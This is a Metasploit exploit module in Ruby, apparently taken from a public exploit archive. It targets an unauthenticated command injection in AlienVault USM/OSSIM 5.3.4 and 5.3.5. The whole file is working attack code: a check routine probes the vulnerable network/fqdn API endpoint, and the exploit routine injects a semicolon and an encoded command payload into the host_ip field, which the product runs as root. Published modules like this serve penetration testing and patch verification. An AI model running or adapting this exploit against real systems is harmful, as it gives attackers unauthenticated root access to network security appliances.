# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;          => &#039;AlienVault USM/OSSIM API Command Execution&#039;,
      &#039;Description&#039;   => %q{
        This module exploits an unauthenticated command injection in Alienvault USM/OSSIM versions 5.3.4 and 5.3.5. The vulnerability lies in an API function that does not check for authentication and then passes user input directly to a system call as root. 
      },
      &#039;Author&#039;        =>
        [
          &#039;Unknown&#039;, # Privately disclosed to Alienvault
          &#039;Peter Lapp (lappsec@gmail.com)&#039; # Metasploit module
        ],
      &#039;License&#039;       => MSF_LICENSE,
      &#039;References&#039;    =>
        [
          [&#039;URL&#039;, &#039;https://www.alienvault.com/forums/discussion/8415/&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Payload&#039;        =>
        {
          &#039;Compat&#039;      => {
            &#039;PayloadType&#039; => &#039;cmd&#039;
          }
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039; => true
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, { }]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Feb 5 2017&#039;))
 
    register_options(
      [
        Opt::RPORT(40011)
      ], self.class)
  end
 
  def check
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;/av/api/1.0/system/local/network/fqdn&#039;),
      &#039;vars_post&#039; => {
        &#039;host_ip&#039;    => "127.0.0.1"
      },
          &#039;headers&#039;  => {
            &#039;Accept&#039; => "application/json"
      }
    })
 
    if res and res.code == 200 and res.body.include?(&#039;success&#039;)
      return Exploit::CheckCode::Vulnerable
    end
 
    return Exploit::CheckCode::Safe
  end
 
  def exploit
 
    print_status("Executing payload...")
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;/av/api/1.0/system/local/network/fqdn&#039;),
      &#039;vars_post&#039; => {
        &#039;host_ip&#039;    => ";#{payload.encoded}"
      },
          &#039;headers&#039;  => {
            &#039;Accept&#039; => "application/json"
      }
    })
  end
 
 
end

